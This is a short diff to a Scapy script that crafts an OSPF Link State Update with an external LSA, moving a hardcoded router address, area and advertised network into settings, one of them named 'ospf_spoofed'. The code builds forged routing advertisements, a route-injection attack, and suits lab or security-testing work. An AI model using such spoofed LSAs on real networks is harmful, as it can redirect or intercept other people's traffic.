@@ -17,8 +17,8 @@ import binascii
 
 # handmade
 ip_pkt = IP(src=settings.source_ip,dst=settings.destination_ip, ttl=1)/\
-    OSPF_Hdr(type=4, src="10.88.88.254", area="0.0.0.0")/\
-    OSPF_LSUpd(lsacount=1, lsalist=[OSPF_External_LSA(id="10.99.99.0", adrouter="10.88.88.254", mask="255.255.255.0", ebit=1)])
+    OSPF_Hdr(type=4, src=settings.ospf_spoofed, area=settings.ospf_area)/\
+    OSPF_LSUpd(lsacount=1, lsalist=[OSPF_External_LSA(id=settings.ospf_network_adv, adrouter=settings.ospf_spoofed, mask="255.255.255.0", ebit=1)])
 
 ip_pkt.show()
 
